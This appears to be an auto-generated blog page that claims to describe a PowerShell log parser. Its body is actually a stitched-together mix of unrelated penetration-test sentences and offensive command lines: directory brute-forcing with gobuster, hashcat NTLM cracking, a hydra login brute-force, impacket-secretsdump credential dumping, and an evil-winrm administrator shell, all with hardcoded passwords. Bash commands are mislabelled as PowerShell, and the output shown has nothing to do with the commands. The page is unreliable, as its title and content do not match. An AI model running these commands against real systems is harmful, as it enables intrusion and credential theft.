---
TitleSEO: "Log Parser and Analyzer in PowerShell | ZureFX"
TitlePost: "Log Parser and Analyzer — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for log parser and analyzer. Built for security research and automation."
Keywords: "script, parser, tool, python, rust, powershell"
URL: "https://zurefx.github.io/scripting/script-log-parser-and-analyzer-680.html"
URL_IMAGES: ""
Date: "2024-11-08"
Tags: "Script, Parser, Tool, Python, Rust, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-log-parser-and-analyzer-680"
Permalink: "/scripting/script-log-parser-and-analyzer-680.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `feroxbuster`
- `nikto`
- `bloodhound`

## Implementation

### Core Logic

Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target.

```powershell
gobuster dir -u http://10.115.87.152/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

### Helper Functions

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.76.179.169 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.52.243.52
```

## Usage

### Basic Usage

The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

```bash
nmap -sCV -p110,1521,21 10.87.77.220 -oN scan.txt
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.30.141.127
gobuster dir -u http://10.117.2.60/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.10.237.21 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities.

```
[+] Scanning target...
[+] Found 2 results
[+] Done in 10.34s
```
